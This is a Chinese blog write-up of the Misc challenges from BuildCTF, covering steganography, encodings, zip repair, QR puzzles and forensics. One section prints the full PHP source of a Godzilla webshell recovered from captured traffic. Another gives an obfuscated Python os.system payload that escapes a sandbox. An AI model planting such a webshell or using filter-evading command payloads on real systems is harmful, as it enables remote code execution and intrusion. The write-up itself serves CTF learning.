---
title: "BuildCTF WP Misc部分"
description: "BuildCTF个人做题笔记"
date: 2024-10-24T22:35:40+08:00
image: 
math: 
license: 
hidden: false
comments: true
categories:
    - CTF
tags:
    - CTF
    - WP
    - Misc
    - 取证
---
# BuildCTF WP Misc部分
*第一次和各位师傅把misc AK了，太强了，太有成就感了！感谢各位*
## what is this?

from binary得到

> ccc,ppppp,ccppcp,p,cccc,cpppp,ccc,ccppcp,cpppp,ccccc,ccppcp,pp,ppppp,cpc,ccccc,c,ccppcp,pcpc,ppppp,pcc,c,ccppcp,pcpcpp,pcpcpp

将`c`对应`.`，`p` 对应`-` 得到`S0_TH1S_15_M0R5E_C0DE_!!`

## 别真给我开盒了哥

根据图片搜S3901找到[视频](https://www.bilibili.com/video/BV1Wc411Z7cR/?share_source=copy_web&vd_source=aee69620965121d361d7a9f8a6c029aa&t=84)

知道是S3700高速，找一下旁边平行的铁路有津霸客运专线，也就是`津保铁路`

## 如果再来一次，还会选择我吗？

看一眼文件头和文件尾，是两个字节之间的交换
```python
with open("password.png", 'rb') as file:
        data = bytearray(file.read())

# 交换每两个相邻字节
for i in range(0, len(data) - 1, 2):
    data[i], data[i + 1] = data[i + 1], data[i]

# 将修改后的数据写入新文件
with open("output_file.png", 'wb') as file:
    file.write(data)
```
得到解压密码：`8!67adz6`，在线网站直接扫条形码得到`key:wo_bu_shi_xiao_hei_zi!!!`，最后套好几次 Base64 解出 `BuildCTF{y0u_are_great_boy}`

## 老色批

lsb隐写，提取Red0 Green0 Blue0按Row，LSBfirst得到 `QnVpbGRDVEZ7MV9hbV9uMHRfTFNCISEhfQ==` Base64解码一下得到flag `BuildCTF{1_am_n0t_LSB!!!}`

## 一念愚即般若绝，一念智即般若生

阴阳怪气加密+与佛论禅+[天书奇谈](https://github.com/BlackCat184/Sealed-Book)+Base58

`BuildCTF{D3crypt10n_1s_4_l0ng_r04d}`

## 四妹，你听我解释

winhex打开在文件末尾(IEND后)得到密文的前半段，crc爆破图片原有长宽得到密文后半段，组合起来核心价值观解密得到flag

> 密文：自由文明法治平等公正敬业公正友善公正公正自由自由和谐平等自由自由公正法治友善平等公正诚信文明公正民主公正诚信平等平等诚信平等法治和谐公正平等平等友善敬业法治富强和谐民主法治诚信和谐

`BuildCTF{lao_se_p1}`

## 白白的真好看

flag1:打开doc文件，在字体样式中把隐藏文字关了，得到第一部分`BuildCTF{Th3_wh1t3`

flag2:打开第1个txt文件，看到文件名00000000结合文档空白的内容联想到零宽隐写，在线网站得`_y0u_s33`

flag3:扫描汉信码关注公众号回复雪得到`snowsnow`，结合第2个txt的文件名和内容中出现的许多空格和制表符，查到snow隐写，snowsnow为密钥，得`_1s_n0t_wh1t3`

## 四妹？还是萍萍呢？

二维码拼图，扫码得到林风云公众号。

binwalk检查图片，发现End of Zip archive，winhex打开后定位到对应的IDAT，在这个IDAT头部发现0304，是zip文件头的一半。将这个IDAT提取出来，补全文件头，发现压缩包里包含公众号回复`password有惊喜.txt`，发送后得到`St7wg.`。用密码解压，发现txt里是base64编码的png，转换后进行crc爆破，得到`BuildCTF{PNG_@nd_H31Sh3nHu@}`

## 食不食油饼

文字盲水印PuzzleSolver提取，b64得到`key:7gkjT!opo`

key.jpg用WaterMarkH提取`8GMdP3`

flag.txt > IJ2WS3DEINKEM62XMF2DG4SNMFZGWXZRONPVGMC7MVQVG6L5

b32 > BuildCTF{Wat3rMark_1s_S0_eaSy}

## EZ_ZIP
```python
import shutil

for i in range(499,0,-1):
    shutil.unpack_archive(f"./layer_{i}.zip", f"./", "zip")
```
# 有黑客！！！

哥斯拉webshell流量，stream 11809中，解密返回payload。

`Buildctf{WireshArk_1s_vEry_Ez}`

stream 11809:   /uploads/shell.php                            哥斯拉
```php

@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='hhhhacker';
$payloadName='payload';
  $key='73b761208d5c05f2';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key); //Encode payload with $key.
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key); //Decode payload with $key.
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

## 心算

`__𝑖𝑚𝑝𝑜𝑟𝑡__("\157\163").𝑠𝑦𝑠𝑡𝑒𝑚("\143\141\164\40\146\154\141\147")`

## Guesscoin

nc连接容器，发现欢迎来到硬币猜测游戏!你需要猜100次,猜对60次才能获得flag。

简单尝试一次，就通过了。

恭喜你！你猜对了64次 欢迎拿到flag:

## 我太喜欢亢金星君了！

白图是分隔，黑图不用管

> -... ..- .. .-.. -.. -.-. - ..-. ----.-- .-- ....- .---- -.-. --- -- ....- ..--.- -. ....- .-- ..--.- ..-. .---- ... .... ----.-

`BUILDCTFW41COM4_N4W_F1SH`

## Black&White

文件夹里有1089张纯黑/纯白的方形图片，猜测可以拼成33*33的二维码。

使用python拼图，扫码得到 `3I8XEDHUCJTARQFOEDX7D+08AC80T8N08Y6948DF2C43C9B6Z2`，使用Base45解码，得到flag。

`BuildCTF{Tich1?pAnDa?_HahA_U_w1n}`

## HEX的秘密
```python
with open("flag.txt", "r", encoding="utf-8") as f:
    flag = f.read()

flag = [flag[i:i+2] for i in range(0, len(flag), 2)]

flag = [hex(int(i, 16) ^ 0x80) for i in flag]
print("".join(flag))
```
得到`0x420x750x690x6c0x640x430x540x460x7b0x330x450x7a0x7a0x5f0x410x350x630x210x210x5f0x620x690x6e0x610x720x790x790x790x7d`

from hex 得到 `BuildCTF{3Ezz_A5c!!_binaryyy}`

## FindYourWindows

用veracyrypt挂载，diskgenius恢复回收站里的文件找到flag.txt，得到`BuildCTF{I2t_s0_e5sy!!!}`

## E2_?_21P

将加密的两个标志位改成0，解压发现CRC校验失败，在010中将源数据区和目录区的压缩方法修改，BrainFuck解密得到`BuildCTF{Da7A_Cowbr355lon_15_3A5Y}`